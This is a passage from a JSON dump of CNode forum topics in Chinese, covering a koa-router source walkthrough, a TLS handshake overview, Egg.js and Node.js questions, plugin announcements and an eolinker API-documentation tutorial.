statusCode 没有设置或者值为 404 的时候\n      if (!ctx.status || ctx.status === 404) {\n        &#x2F;&#x2F; 这里的 matched 就是在 match 函数执行之后返回结果集中的 path 数组\n        &#x2F;&#x2F; 也就是说请求路径与路由正则匹配的 layer 实例对象数组\n        ctx.matched.forEach(function (route) {\n          &#x2F;&#x2F; 将这些 layer 路由的 HTTP 方法存储起来\n          route.methods.forEach(function (method) {\n            allowed[method] = method;\n          });\n        });\n        &#x2F;&#x2F; 将上面的 allowed 整理为数组\n        var allowedArr = Object.keys(allowed);\n        &#x2F;&#x2F; implemented 就是 Router 配置中的 methods 数组, 也就是允许的方法\n        &#x2F;&#x2F; 这里通过 ~ 运算判断当前的请求方法是否在配置允许的方法中\n        &#x2F;&#x2F; 如果该方法不被允许\n        if (!~implemented.indexOf(ctx.method)) {\n          &#x2F;&#x2F; 如果 Router 配置中配置 throw 为 true\n          if (options.throw) {\n            var notImplementedThrowable;\n            &#x2F;&#x2F; 如果配置中规定了 throw 抛出错误的函数, 那么就执行对应的函数\n            if (typeof options.notImplemented === &#x27;function&#x27;) {\n              notImplementedThrowable = options.notImplemented(); &#x2F;&#x2F; set whatever the user returns from their function\n            } else {\n            &#x2F;&#x2F; 如果没有则直接抛出 HTTP Error\n              notImplementedThrowable = new HttpError.NotImplemented();\n            }\n            &#x2F;&#x2F; 抛出错误\n            throw notImplementedThrowable;\n          } else {\n            &#x2F;&#x2F; Router 配置 throw 为 false\n            &#x2F;&#x2F; 设置状态码为 501\n            ctx.status = 501;\n            &#x2F;&#x2F; 并且设置 Allow 头部, 值为上面得到的允许的方法数组 allowedArr\n            ctx.set(&#x27;Allow&#x27;, allowedArr.join(&#x27;, &#x27;));\n          }\n        } else if (allowedArr.length) {\n          &#x2F;&#x2F; 来到这里说明该请求的方法是被允许的, 那么为什么会没有状态码 statusCode 或者 statusCode 为 404 呢?\n          &#x2F;&#x2F; 原因在于除却特殊情况, 我们一般在业务逻辑里面不会处理 OPTIONS 请求的\n          &#x2F;&#x2F; 发出这个请求一般常见就是非简单请求, 则会发出预检请求 OPTIONS\n          &#x2F;&#x2F; 例如 application&#x2F;json 格式的 POST 请求\n          \n          &#x2F;&#x2F; 如果是 OPTIONS 请求, 状态码为 200, 然后设置 Allow 头部, 值为允许的方法数组 methods\n          if (ctx.method === &#x27;OPTIONS&#x27;) {\n            ctx.status = 200;\n            ctx.body = &#x27;&#x27;;\n            ctx.set(&#x27;Allow&#x27;, allowedArr.join(&#x27;, &#x27;));\n          } else if (!allowed[ctx.method]) {\n          &#x2F;&#x2F; 方法被服务端允许, 但是在路径匹配的路由中没有找到对应本次请求的方法的处理函数\n            &#x2F;&#x2F; 类似上面的逻辑\n            if (options.throw) {\n              var notAllowedThrowable;\n              if (typeof options.methodNotAllowed === &#x27;function&#x27;) {\n                notAllowedThrowable = options.methodNotAllowed(); &#x2F;&#x2F; set whatever the user returns from their function\n              } else {\n                notAllowedThrowable = new HttpError.MethodNotAllowed();\n              }\n              throw notAllowedThrowable;\n            } else {\n              &#x2F;&#x2F; 这里的状态码为 405\n              ctx.status = 405;\n              ctx.set(&#x27;Allow&#x27;, allowedArr.join(&#x27;, &#x27;));\n            }\n          }\n        }\n      }\n    });\n};\n</code></pre><p>值得注意的是, Router.methods 数组里面的方法是服务端需要实现并支持的方法, 如果客户端发送过来的请求方法不被允许, 那么这是一个服务端错误 501, 但是如果这个方法被允许, 但是找不到对应这个方法的路由处理函数(比如相同路由的 POST 路由但是用 GET 方法来获取数据), 这是一个客户端错误 405.</p>\n<h3>Router.prototype.use</h3>\n<p>use 函数就是用于添加中间件的, 只不过不同于 koa 中的 use 函数, router 的 use 函数添加的中间件函数会在所有路由执行之前执行.此外, 它还可以对某些特定路径的进行中间件函数的绑定执行.</p>\n<pre class=\"prettyprint\"><code>Router.prototype.use = function () {\n  var router = this;\n  &#x2F;&#x2F; 中间件函数数组\n  var middleware = Array.prototype.slice.call(arguments);\n  var path;\n\n  &#x2F;&#x2F; 支持同时为多个路由绑定中间件函数: router.use([&#x27;&#x2F;use&#x27;, &#x27;&#x2F;admin&#x27;], auth());\n  if (Array.isArray(middleware[0]) &amp;&amp; typeof middleware[0][0] === &#x27;string&#x27;) {\n    middleware[0].forEach(function (p) {\n      &#x2F;&#x2F; 递归调用\n      router.use.apply(router, [p].concat(middleware.slice(1)));\n    });\n    &#x2F;&#x2F; 直接返回, 下面是非数组 path 的逻辑\n    return this;\n  }\n  &#x2F;&#x2F; 如果第一个参数有传值为字符串, 说明有传路径\n  var hasPath = typeof middleware[0] === &#x27;string&#x27;;\n  if (hasPath) {\n    path = middleware.shift();\n  }\n    \n  middleware.forEach(function (m) {\n    &#x2F;&#x2F; 如果有 router 属性, 说明这个中间件函数是由 Router.prototype.routes 暴露出来的\n    &#x2F;&#x2F; 属于嵌套路由\n    if (m.router) {\n      &#x2F;&#x2F; 这里的逻辑很有意思, 如果是嵌套路由, 相当于将需要嵌套路由重新注册到现在的 Router 对象上\n      m.router.stack.forEach(function (nestedLayer) {\n        &#x2F;&#x2F; 如果有 path, 那么为需要嵌套的路由加上路径前缀\n        if (path) nestedLayer.setPrefix(path);\n        &#x2F;&#x2F; 如果本身的 router 有前缀配置, 也添加上\n        if (router.opts.prefix) nestedLayer.setPrefix(router.opts.prefix);\n        &#x2F;&#x2F; 将需要嵌套的路由模块的 stack 中存储的 Layer 加入到本 router 对象上\n        router.stack.push(nestedLayer);\n      });\n      &#x2F;&#x2F; 这里与 register 函数的逻辑类似, 注册的时候检查添加参数校验函数 params\n      if (router.params) {\n        Object.keys(router.params).forEach(function (key) {\n          m.router.param(key, router.params[key]);\n        });\n      }\n    } else {\n      &#x2F;&#x2F; 没有 router 属性则是常规中间件函数, 如果有给定的 path 那么就生成一个 Layer 模块进行管理\n      &#x2F;&#x2F; 如果没有 path, 那么就生成通配的路径 (.*) 来生成 Layer 来管理\n      router.register(path || &#x27;(.*)&#x27;, [], m, { end: false, ignoreCaptures: !hasPath });\n    }\n  });\n\n  return this;\n};\n</code></pre><p>通过上面我们就清楚, 在 koa-router 里面, 它将所有的路由与所有路由都适用的中间件函数都看做 Layer, 通过 Layer 来处理, 然后将他们的回调函数存储在 Layer 实例本身的 stack 数组中, 然后全局的 router 实例对象的 stack 数组存放所有的 Layer 达到全局管理的目的.</p>\n<h2>router 处理请求的流程</h2>\n<p>上面就是 koa-router 的核心 API, 下面我们通过一张图来总结一下, 看一下当一个请求来临, koa-router 是如何处理的:\n<img src=\"http://ofsur12wi.bkt.clouddn.com/%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B%E5%9B%BE.png\" alt=\"一个请求处理流程图\"></p>\n<h2>附录</h2>\n<h3>为什么需要在 GET 请求放一个 HEAD 请求 ?</h3>\n<p>我们可以看到在 Layer 的构建函数里面, 在对于 methods 的处理中, 会进行判断如果该请求为 GET 请求, 那么就需要在 GET 请求前面添加一个 HEAD 方法, 其原因在于 HEAD 方法与 GET 方法基本是一致的, 所以 koa-router 在处理 GET 请求的时候顺带将 HEAD 请求一并处理, 因为两者的区别在于 HEAD 请求不响应数据体.</p>\n</div>","title":"全面理解 koa-router","last_reply_at":"2019-03-29T06:03:06.982Z","good":false,"top":false,"reply_count":5,"visit_count":5492,"create_at":"2018-06-03T10:21:21.246Z","author":{"loginname":"zhangxiang958","avatar_url":"https://avatars1.githubusercontent.com/u/13307374?v=4&s=120"}},{"id":"5c9d9ea599e62a362ff410c1","author_id":"5c98426500bcfd7eb2be5add","tab":"share","content":"<div class=\"markdown-text\"><h1>SSL或TLS握手的概述</h1>\n<p>SSL或TLS握手建立了用于客户端和服务端通信的秘钥。</p>\n<p>客户端和服务端SSL或TLS能够相互通信的基本步骤：</p>\n<ul>\n<li>确认使用协议的版本</li>\n<li>选择加密算法</li>\n<li>通过交换和验证数字证书对彼此进行身份验证</li>\n<li>使用非对称加密技术生成共享密钥，避免了密钥分发问题。然后SSL或TLS使用共享密钥对消息进行对称加密解密，这比非对称加密更快</li>\n</ul>\n<p>综上所述SSL握手的步骤如下：</p>\n<ol>\n<li>SSL或TLS客户端先向服务端发送一个加密通信请求，叫做ClientHello请求。该请求包含以下信息：\n<ul>\n<li>客户端支持的SSL或者TLS版本</li>\n<li>客户端生成的随机数，用于生成后续通信的随机字符串（“对话密钥”）</li>\n<li>客户端支持的加密算法</li>\n</ul>\n</li>\n<li>SSL或TLS服务端收到客户端请求后，向客户端发出响应，叫做ServerHello。该响应包含以下信息：\n<ul>\n<li>服务端从客户端提供的SSL或TLS列表中选择的版本</li>\n<li>Sesstion ID 和 另外生成的随机数</li>\n<li>服务端的数字证书（如果服务端需要用于客户端身份验证的数字证书，则服务端发送一个客户端证书请求，其中包含受支持的证书类型列表和可接受的认证机构(CAs)的专有名称。）</li>\n<li>确认使用的加密算法</li>\n</ul>\n</li>\n<li>客户端收到服务端响应后，首先校验服务端发来的数字证书决定是否继续通信。</li>\n<li>证书校验通过，会像服务端发送以下信息：\n<ul>\n<li>生成一个随机数，并对这个随机数用从服务端数字证书中取出的公钥加密（用与生成后续通信的“随机密钥”）</li>\n</ul>\n</li>\n<li>如果服务端发送了一个客户端证书请求，客户端将会发送一个用客户端私钥加密的随机字符串和客户端的数字证书，或者没有数字证书的警告。在某些强制客户端证书的实现中，如果客户端没有数字证书责握手会失败</li>\n<li>服务端接受并验证客户端证书</li>\n<li>客户端向服务端发送一条完成的消息，该消息使用密钥加密，表示握手的客户端部分已经完成。</li>\n<li>服务端向客户端发送一条完成的消息，该消息使用密钥加密，表示握手的服务端部分已经完成</li>\n<li>在SSL或TLS会话期间，服务端和客户端现在可以交换使用共享密钥对称加密的消息</li>\n</ol>\n</div>","title":"SSL或TLS握手的概述","last_reply_at":"2019-03-29T04:27:17.407Z","good":false,"top":false,"reply_count":0,"visit_count":422,"create_at":"2019-03-29T04:27:17.407Z","author":{"loginname":"lvwxx","avatar_url":"https://avatars2.githubusercontent.com/u/15207681?v=4&s=120"}},{"id":"5c9ae053fd41137eb76621dd","author_id":"582180b9d5e70f900534345b","tab":"share","content":"<div class=\"markdown-text\"><p>个人网站新上友链模块，欢迎各路大神前来申请站位。</p>\n<p>个人网站信息</p>\n<p>链接： <a href=\"https://www.lcddjm.com\">https://www.lcddjm.com</a>\n昵称：lcddjm\n头像链接： <a href=\"https://image.lcddjm.com/avatar/b34681a0-4be0-11e8-94a9-75503d77c645.png\">https://image.lcddjm.com/avatar/b34681a0-4be0-11e8-94a9-75503d77c645.png</a>\n介绍：星空不问赶路人，时光不负有心人。</p>\n<p>评论区留言，早占坑 😂</p>\n</div>","title":"[友链] 个人网站友链申请","last_reply_at":"2019-03-29T03:55:58.996Z","good":false,"top":false,"reply_count":5,"visit_count":799,"create_at":"2019-03-27T02:30:43.355Z","author":{"loginname":"JaqenZhang","avatar_url":"https://avatars3.githubusercontent.com/u/19965441?v=4&s=120"}},{"id":"5c9d88de99e62a362ff41038","author_id":"5909444b782dbc4b183ecfe2","tab":"share","content":"<div class=\"markdown-text\"><blockquote>\n<p>前面刚刚说不要瞎折腾这种东西了\n结果身体却很诚实，又写了一个 vscode 扩展.</p>\n</blockquote>\n<p>在 vscode 中查看热映电影、即将上映的电影和评分前 250 名的电影.</p>\n<p>在写代码之余，不妨关注下影讯，放松自己。</p>\n<p>我们应该把更多的娱乐(上班滑水)元素带入 <code>vscode</code>。不要为资本家 996 了进 ICU。</p>\n<p>截图\n<img src=\"https://github.com/axetroy/vscode-movie/raw/master/screenshot-1.png\" alt=\"Screenshot\">\n<img src=\"https://github.com/axetroy/vscode-movie/raw/master/screenshot-2.png\" alt=\"Screenshot\"></p>\n<p>Github: <a href=\"https://github.com/axetroy/vscode-movie\">https://github.com/axetroy/vscode-movie</a>\n安装: <a href=\"https://marketplace.visualstudio.com/items?itemName=axetroy.vscode-movie\">axetroy.vscode-movie</a></p>\n</div>","title":"用VSCODE写代码之余，不妨看看有什么好电影","last_reply_at":"2019-03-29T02:54:22.617Z","good":false,"top":false,"reply_count":0,"visit_count":646,"create_at":"2019-03-29T02:54:22.617Z","author":{"loginname":"axetroy","avatar_url":"https://avatars2.githubusercontent.com/u/9758711?v=4&s=120"}},{"id":"5c9c7100484eeb3634157ea2","author_id":"56ce68bc842c03521a73520e","tab":"ask","content":"<div class=\"markdown-text\"><p>我用的是Egg框架，原生的ctx.getFileStream()可以获取到文件流，但是只支持multipart/form-data。\n现在我对接的前端只能用application/octet-stream，所以我需要找到办法获取到请求中的二进制文件。</p>\n</div>","title":"求助：如何获取请求数据中的二进制文件？","last_reply_at":"2019-03-29T01:37:12.855Z","good":false,"top":false,"reply_count":2,"visit_count":375,"create_at":"2019-03-28T07:00:16.849Z","author":{"loginname":"JarvisQJ","avatar_url":"https://avatars1.githubusercontent.com/u/15104950?v=4&s=120"}},{"id":"5c9cd3a5484eeb3634158093","author_id":"5c9cd34d99e62a362ff40e45","tab":"ask","content":"<div class=\"markdown-text\"><p>node.js cluster模块的负载均衡算法可以自定义吗</p>\n</div>","title":"node.js cluster模块","last_reply_at":"2019-03-29T01:28:00.425Z","good":false,"top":false,"reply_count":2,"visit_count":384,"create_at":"2019-03-28T14:01:09.545Z","author":{"loginname":"Linezy","avatar_url":"https://avatars3.githubusercontent.com/u/35105473?v=4&s=120"}},{"id":"5c9b3336fd41137eb76626bc","author_id":"5a24ea201c0db2f94a3aee8d","tab":"ask","content":"<div class=\"markdown-text\"><p>egg 的文件夹命名， 一般都用单数， 比如 app 下的 model 和 controller\n然而为什么 run dev 默认生成的日志文件夹是 <code>logs</code> （应该够可以配置）, 强迫症很抓狂</p>\n</div>","title":"egg 文件夹命名单复数","last_reply_at":"2019-03-29T01:08:14.909Z","good":false,"top":false,"reply_count":4,"visit_count":451,"create_at":"2019-03-27T08:24:22.566Z","author":{"loginname":"acfasj","avatar_url":"https://avatars2.githubusercontent.com/u/20757983?v=4&s=120"}},{"id":"5c9c4d2799e62a362ff40b58","author_id":"5c862e877ce0df3732426edf","tab":"ask","content":"<div class=\"markdown-text\"><p>现在我创建一个数据库, 例如创建一个USER表,USER有几个职业(老师,学生,教授)最多不超过4个类型的数据,我需要创建多一个张表job来保存这个几个数据,还是直接在代码设置常量就好尼。。</p>\n</div>","title":"[数据库设计]","last_reply_at":"2019-03-28T15:35:39.568Z","good":false,"top":false,"reply_count":4,"visit_count":655,"create_at":"2019-03-28T04:27:19.868Z","author":{"loginname":"cheerApril","avatar_url":"https://avatars0.githubusercontent.com/u/38412944?v=4&s=120"}},{"id":"5c98ee28fd41137eb76619b1","author_id":"5c98ed8300bcfd7eb2be614f","tab":"ask","content":"<div class=\"markdown-text\"><p>去 fork ，然后修改 bug , 然后去 npm 重新发布一个新的 package？</p>\n</div>","title":"项目中使用的 一些 npm package 不维护了，应该怎么处理？","last_reply_at":"2019-03-28T09:09:19.166Z","good":false,"top":false,"reply_count":12,"visit_count":1160,"create_at":"2019-03-25T15:05:12.467Z","author":{"loginname":"NiLinli","avatar_url":"https://avatars2.githubusercontent.com/u/25059127?v=4&s=120"}},{"id":"5c9b3dd200bcfd7eb2be6e6f","author_id":"590a8584bbaf2f3f569be508","tab":"ask","content":"<div class=\"markdown-text\"><p>我司现在有个需求是在一个新闻列表中点击某一条，然后可以在pc端模拟展示出该新闻在移动端的页面预览。类似如下效果，但是由于移动端的链接项目页面结构是不确定的，且没有使用响应式，有没有朋友有相关的实现经验，可以实现这个功能。</p>\n<p><img src=\"//static.cnodejs.org/Fg6hToE8yYxY1yrDPR8tfgAjqPzc\" alt=\"1553677288(1).jpg\"></p>\n</div>","title":"如何在pc端实现预览移动端页面的效果？","last_reply_at":"2019-03-28T07:06:42.382Z","good":false,"top":false,"reply_count":3,"visit_count":589,"create_at":"2019-03-27T09:09:38.150Z","author":{"loginname":"GeekHi","avatar_url":"https://avatars2.githubusercontent.com/u/22934185?v=4&s=120"}},{"id":"5c7c8d8b5b8cb21491ca56b6","author_id":"5c247db93898674067a78f02","tab":"ask","content":"<div class=\"markdown-text\"><p>egg.js中实现RESTfull api，vue请求post数据提示 missing csrf token</p>\n<p><img src=\"//static.cnodejs.org/FsadJ4J2Ln6qZilgzTaTWCZmYhzQ\" alt=\"2.png\"></p>\n</div>","title":"egg.js中实现RESTfull api，vue请求post数据提示 missing csrf token","last_reply_at":"2019-03-28T06:48:17.982Z","good":false,"top":false,"reply_count":20,"visit_count":1301,"create_at":"2019-03-04T02:29:31.323Z","author":{"loginname":"gougou168","avatar_url":"https://avatars2.githubusercontent.com/u/46184813?v=4&s=120"}},{"id":"5c9a16eb00bcfd7eb2be66f9","author_id":"5b376dfcac8bc1e124114500","tab":"ask","content":"<div class=\"markdown-text\"><p>最近在考虑一个问题，看看各位同行有什么见解：\n我一直在用 hexojs 写博客日记，因不习惯  IDE 的 markdown 插件和为了用的更加顺手，专门用 electron 开发了一款 hexojs 客户端 <a href=\"https://github.com/tmirun/Hexo-Note\">hexo note</a>，\n今天看到了这个 vscode hexo 的 插件 <a href=\"https://github.com/cwxyz007/vscode-hexo-utils\">vscode-hexo-utils</a>， 感觉利用 vscode 开发插件也是很不错的路子。中间可以节省了很多造轮子的步骤。（我用的 IDE 是 webstorm，所以近期看到 vscode 插件 😂）\n在这里想和大家讨论一下这个问题， electron 和 vscode 插件，你会选哪个来开发？\n在这里我们强调下面 3 点：</p>\n<ul>\n<li>可维护性</li>\n<li>开发速度</li>\n<li>用户体验</li>\n</ul>\n</div>","title":"Hexo.js 客户端：Electron 还是 vscode 插件？","last_reply_at":"2019-03-27T21:47:24.142Z","good":false,"top":false,"reply_count":6,"visit_count":606,"create_at":"2019-03-26T12:11:23.077Z","author":{"loginname":"tmirun","avatar_url":"https://avatars1.githubusercontent.com/u/8052536?v=4&s=120"}},{"id":"5c9adb3efd41137eb7662141","author_id":"5b1d495729e6e510415b29b0","tab":"ask","content":"<div class=\"markdown-text\"><p>比如  let arr = [arr1,arr2,arr3,arr4];\narr1,arr2,arr3,arr4里面还有很多数组。\n请问如果数据量很大的话，用foreach嵌套会很耗时吗?\n请问有什么好一点的方法提升遍历数据量大的数组的效率呢？</p>\n</div>","title":"请问如何提高多层数组的遍历效率？","last_reply_at":"2019-03-27T08:38:15.355Z","good":false,"top":false,"reply_count":5,"visit_count":491,"create_at":"2019-03-27T02:09:02.045Z","author":{"loginname":"helloHT","avatar_url":"https://avatars3.githubusercontent.com/u/31006740?v=4&s=120"}},{"id":"5c9b08ecfd41137eb7662477","author_id":"5c91ace496558e26e1b677bd","tab":"ask","content":"<div class=\"markdown-text\"><p>Agent在官方文档中说明，用于作为Master的【秘书】进行公共事务的处理，那么Agent为什么不和Master合并，将Master直接用于处理公共事务，直接省去了内存开销和复杂的进程间通讯?是因为担心公共事务出错导致Master的崩溃进一步导致所有服务的停止吗？另外，Agent与Worker的通信是通过Master传达的，那为什么又要使用cluster-client进行长连接，使Agent再次绕过Master进行通讯，直接设计为直接通信不也是更省事吗？</p>\n<p>我对于eggjs的设计思想知之甚少，只是提出我的疑问，希望得到你们的回答，谢谢大家。</p>\n</div>","title":"Eggjs中Agent的问题","last_reply_at":"2019-03-27T06:31:05.587Z","good":false,"top":false,"reply_count":2,"visit_count":475,"create_at":"2019-03-27T05:23:56.749Z","author":{"loginname":"HyperClockUp","avatar_url":"https://avatars2.githubusercontent.com/u/36909196?v=4&s=120"}},{"id":"5c9b0572fd41137eb7662451","author_id":"5c90939f96558e26e1b66e84","tab":"ask","content":"<div class=\"markdown-text\"><p>如何学习vue</p>\n</div>","title":"关于vue-cli","last_reply_at":"2019-03-27T05:44:27.721Z","good":false,"top":false,"reply_count":2,"visit_count":340,"create_at":"2019-03-27T05:09:06.735Z","author":{"loginname":"xuejiancnode","avatar_url":"https://avatars0.githubusercontent.com/u/48708465?v=4&s=120"}},{"id":"5c9b023ffd41137eb7662430","author_id":"5c9092de96558e26e1b66e5b","tab":"share","content":"<div class=\"markdown-text\"><p>头疼</p>\n</div>","title":"关于写代码中的大小写","last_reply_at":"2019-03-27T05:31:40.932Z","good":false,"top":false,"reply_count":1,"visit_count":502,"create_at":"2019-03-27T04:55:27.396Z","author":{"loginname":"Mrxiaotaotao","avatar_url":"https://avatars1.githubusercontent.com/u/48708504?v=4&s=120"}},{"id":"5c999ccb00bcfd7eb2be63ab","author_id":"5844ba449ff0dbf333450784","tab":"ask","content":"<div class=\"markdown-text\"><p>之前一直用的vue，对vuex和vue-router这些比较熟\n这段时间在看react，把react核心概念和官方例子看完并敲了一遍，下一步该看redux还是react-router？还有webpack也还没用过，什么时候开始看webpack好？\n准备把react这一套大概搞明白了就开始写项目练手，希望能够尽快使用react做项目</p>\n</div>","title":"熟练使用vue全家桶，目前在学习react，把react核心概念和官方例子看完了，下一步看redux还是react-router？","last_reply_at":"2019-03-27T02:05:48.088Z","good":false,"top":false,"reply_count":8,"visit_count":564,"create_at":"2019-03-26T03:30:19.398Z","author":{"loginname":"467658159","avatar_url":"https://avatars0.githubusercontent.com/u/15248937?v=4&s=120"}},{"id":"5c77c3e63cc9c540b2641cb1","author_id":"5629da22e6a3804c58159198","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint language-javaScript\"><code>&#x2F;&#x2F;另一种选择排序算法\nconst find = (arr) =&gt; {\n    let index = 0;\n    let small = arr[0];\n    for (let i = 0; i &lt; arr.length; i++) {\n        if (arr[i] &lt; small) {\n            small = arr[i];\n            index = i;\n        }\n    }\n    console.log(index);\n    return index;\n};\n\nconst sort = (arr2) =&gt; {\n    let newArr = [];\n    for (let i = 0; i &lt; arr2.length; i++) {\n        let index = find(arr2);\n        let popArr = arr2.splice(index, 1);\n        newArr.push(popArr[0]);\n    }\n    return newArr;\n};\nconsole.log(sort(values));\n\n</code></pre></div>","title":"谁能看出这种选择排序的bug在哪里,怎么改进可以正确输出","last_reply_at":"2019-03-27T01:36:49.509Z","good":false,"top":false,"reply_count":4,"visit_count":657,"create_at":"2019-02-28T11:20:06.486Z","author":{"loginname":"qxl1231","avatar_url":"https://avatars1.githubusercontent.com/u/8305742?v=4&s=120"}},{"id":"5c99ea09fd41137eb7661e14","author_id":"589a8f845dfbcdfa083b4073","tab":"share","content":"<div class=\"markdown-text\"><p><strong>github：<a href=\"https://github.com/lisniuse/egg-direct\">https://github.com/lisniuse/egg-direct</a></strong>\n昨天在写eggjs的时候发现路由太多了管理很不方便，晚上研究了一下egg-core，写出了这个eggjs 路由去中心化插件。\n不需要ts的装饰器，思路比较奇特，直接在方法参数中进行配置并且支持子控制器、多层级控制器，不与默认路由配置文件冲突。</p>\n<h3>依赖的插件</h3>\n<ul>\n<li>egg-core（一般不需要单独安装）</li>\n</ul>\n<h2>开启插件</h2>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; config&#x2F;plugin.js\nexports.direct = {\n  enable: true,\n  package: &#x27;egg-direct&#x27;,\n};\n</code></pre><h2>使用场景</h2>\n<p>使用egg-direct插件，可以不需要装饰器也可以在控制器中定义路由配置。</p>\n<p>在定义的方法的默认参数配置里定义一个router变量，例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>&#x27;use strict&#x27;;\n\nconst Controller = require(&#x27;egg&#x27;).Controller;\n\nclass HomeController extends Controller {\n  async index(router = [\n    [ &#x27;get&#x27;, &#x27;&#x2F;&#x27; ],\n    [ &#x27;get&#x27;, &#x27;&#x2F;home&#x27; ],\n  ]) {\n    this.ctx.body = &#x27;hi, &#x27; + this.app.plugins.direct.name;\n  }\n}\n\nmodule.exports = HomeController;\n</code></pre><p>router 参数接收一个二维数组类型的值，子数组的第一个是router的方法名，对应调用<code>router[method](..argv)</code>，后面的值表示调用参数<code>(...argv)</code>，具体传入参数，可以查看官方文档<a href=\"https://eggjs.org/zh-cn/basics/router.html\">router说明</a>。</p>\n</div>","title":"【eggjs】路由去中心化插件【egg-direct】","last_reply_at":"2019-03-26T10:43:54.381Z","good":false,"top":false,"reply_count":2,"visit_count":390,"create_at":"2019-03-26T08:59:53.455Z","author":{"loginname":"lisniuse","avatar_url":"https://avatars3.githubusercontent.com/u/7500988?v=4&s=120"}},{"id":"5c99975bfd41137eb7661bd7","author_id":"5a0d348fe2f4b8ea22496498","tab":"share","content":"<div class=\"markdown-text\"><h4>前言：</h4>\n<p>一般写完代码之后，还要将各类参数注解写入API文档，方便后续进行对接和测试，这个过程通常都很麻烦，如果有工具可以读取代码注释直接生成API文档的话，那会十分方便。\n此前一直都是在使用eolinker的，但自从去年他们家“注释生成文档”的功能下线后，我就一直活在水深火热当中——真的不想写文档啊，真的好累啊。\n然而这两天上线后，突然发现这个功能重新上线了！必须给大家安利一波！\n官网地址：<a href=\"https://www.eolinker.com?ref=cnodejs\">https://www.eolinker.com</a>\n根据官方的解释，这个功能简单来说就是读取 gitlab（以前应该还能读本地代码） 的 php 代码（截至发文增加支持读取java，更方便了）注释生成 API 文档。</p>\n<p><strong>下面是官方的操作介绍：</strong></p>\n<h4>1.先在EOLINKER新建项目，随后进入项目概况页，可以在概况页中找到“扫描代码注解生成文档”模块。</h4>\n<p><img src=\"//static.cnodejs.org/Fovm1TqsZXgmQEMa_13FKNuxPXR6\" alt=\"图1概况页功能.png\"></p>\n<h4>2.在同步之前我们打开设置看下需要填写什么信息。</h4>\n<p><img src=\"//static.cnodejs.org/FjDGdL0jpsGg8rMqMrlkM7oZJ-t3\" alt=\"图2同步需要填写的信息.png\"></p>\n<p>总共是10个选项，我们来分别看下需要怎么填写：</p>\n<ul>\n<li>1.代码仓库类型，现在默认只有gitlab，在官方群问了他们的PM，后面应该还会支持github。</li>\n<li>2.代码仓库地址，gitlab有线上版本和用户自己搭建私有云版本，线上版本可以填写https://gitlab.com，如果是自己部署的gitlab写域名或者IP端口。</li>\n<li>3.项目ID，gitlab中新建项目后会有一个project ID，填入即可。</li>\n<li>4.访问私钥，通过gitlab的Access Tokens功能可获取，后面会详细介绍如何获取。</li>\n<li>5.需要扫描的分支，默认为master。我们也可以新建一个分支。</li>\n<li>6.需要扫描的API目录路径，建立一个目录作为API目录。</li>\n<li>7.需要扫描的数据结构目录路径，建立一个目录作为数据结构目录。</li>\n<li>8.目标语言，目前默认只有PHP，比较可惜只有一个语言，不过我跟他们客服聊天，说是后面更新的语言支持会增加java。</li>\n<li>9.注解格式，默认为Swagger 2.0，代码注释编写的格式可以按照下面的形式来写，或者参考官方文档http://zircote.com/swagger-php/annotations.html</li>\n</ul>\n<p><strong>比如model的</strong></p>\n<p><img src=\"//static.cnodejs.org/Fk6sycdbL7QOPbrgGC4Ds_WRXo8A\" alt=\"代码截图.png\"></p>\n<p><strong>比如controller的</strong></p>\n<p><img src=\"//static.cnodejs.org/FsN4fGNLFjnwSTQnH-ml_5jcmGqm\" alt=\"代码截图2.png\"></p>\n<ul>\n<li>10.数据同步方式，目前可选<strong>增量更新、全量更新、仅添加新的AP</strong>I三种形式。以上就是需要填写的全部信息。要正确填写这些信息，接下来我们就要转到gitlab进行设置。</li>\n</ul>\n<p>由于官方没有介绍过Gitlab，那还是由我先介绍下比较合适：gitLab 是一个用于仓库管理系统的开源项目，使用git作为代码管理工具，并在此基础上搭建起来的web服务。gitlab跟github有点类似，都是基于web的git仓库，关于注册gitlab新建账号如何操作的部分我就不多说了，但如果你已经有github账号的话，是可以用github账号登录gitLab的。</p>\n<h4>1.首先要新建项目，这里我新建了一个名为demo code的project。</h4>\n<p><img src=\"//static.cnodejs.org/Fpn5dsJmGvHAD8KD2pjCnd_Wkw4V\" alt=\"图3新建项目.png\"></p>\n<p><img src=\"//static.cnodejs.org/Foy12F6zDN5dfAzAqI0JNPUD8qBT\" alt=\"图4新建demo.png\"></p>\n<h4>2.新建后已经有一个master的分支，然后在分支下分别建立两个新的目录：我命名为controllers和models，一个作为API目录路径，一个作为数据结构目录路径。</h4>\n<p><img src=\"//static.cnodejs.org/FmZAeF9BW_hXEJLKnhvmAqr5Bq1w\" alt=\"图5在master下建立目录.png\"></p>\n<h4>3.将写好的php代码上传至分别的目录。可以直接用命令行或者直接将文件上传。</h4>\n<p><img src=\"//static.cnodejs.org/Ft0Y5dWCEPEBzUWJzMy4Vzwh3H8y\" alt=\"图6上传php代码.png\"></p>\n<p><img src=\"//static.cnodejs.org/Fk1Dwi8vl6uLLftNqRG8U-oxGd6W\" alt=\"图7三个php代码.png\"></p>\n<h4>4.成功上传代码后，跟着就是获取密钥。在gitlab中，生成密钥需要用到Access Tokens功能。先进入设置页面，通过左边菜单中的Access Tokens功能，填写对应的项目名称，再根据需要，勾选开放的权限，看不懂也可以按照我下面的截图进行勾选，点击绿框后就可以获取个人的密钥了。如下图：</h4>\n<p><img src=\"//static.cnodejs.org/Fvp0jF-BwsrLRfTobQYZ5lR9Cgsl\" alt=\"图8获取个人密钥.png\"></p>\n<p><img src=\"//static.cnodejs.org/FldyX51xVdc1KVybp5MK6DmOJZp4\" alt=\"图9个人密钥.png\"></p>\n<h4>5.进行到这一步，我们已经把所有的信息都拿到了，再回到EOLINKER将信息填入，请看下图，注意数据同步方式我选择的是增量更新。</h4>\n<p><img src=\"//static.cnodejs.org/FvXe7kE1l8e4NVSjJTxs2P9QOd7l\" alt=\"图10信息设置.png\"></p>\n<p><strong>那我为什么会选择增量更新呢？而三种数据同步更新区别是什么呢？</strong></p>\n<ul>\n<li>增量更新：判断已有API的详细信息，添加新的API信息。用注解的数据替换掉现有的数据。部分注解没有的数据，比如mock、参数值可能性、详细文档等等，均会保留。</li>\n<li>全量更新：在添加新的API的基础上，全量替换现有API内的信息，以注解的为准，不保留注解没有的数据。</li>\n<li>仅添加新的API：判断接口名称是否已经存在，不存在则插入。</li>\n</ul>\n<p><strong>下面举个例子介绍下三种数据同步更新的区别， GitLab中的接口只有参数，而导入 